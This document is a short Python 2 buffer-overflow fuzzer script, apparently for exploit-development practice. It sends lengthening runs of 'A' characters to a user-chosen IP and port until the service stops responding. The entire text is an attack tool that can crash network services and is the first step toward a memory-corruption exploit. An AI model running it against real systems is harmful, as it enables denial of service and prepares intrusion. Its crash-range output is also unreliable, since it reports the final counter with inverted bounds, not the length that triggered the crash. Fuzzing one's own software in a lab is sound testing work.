import socket, time, sys

ip = raw_input("Enter the IP address if the target machine: ")
port = int(raw_input("Enter the port the vulnerable service is running on the target machine: "))
timeout = int(raw_input("Enter the timeout value "))
increment = int(raw_input("Enter the value to be incremented in rach attempt "))
strings = raw_input("Enter the string that is present before payload including spaces, if applicable, else press enter: ")

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += int(increment)

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(int(timeout))
        s.connect((ip, int(port)))
        #s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(strings + string + "\n")
        #payload = ""
        #payload += strings + string + "\n"
        #payload += "\n"
        #s.send(payload)
        s.recv(1024)
        s.close()
    except:
      print("Could not connect to Host")     
      print(str(counter) + " < target bytes for crash < " + str(counter-increment))
      sys.exit(0)        
    time.sleep(1)
    
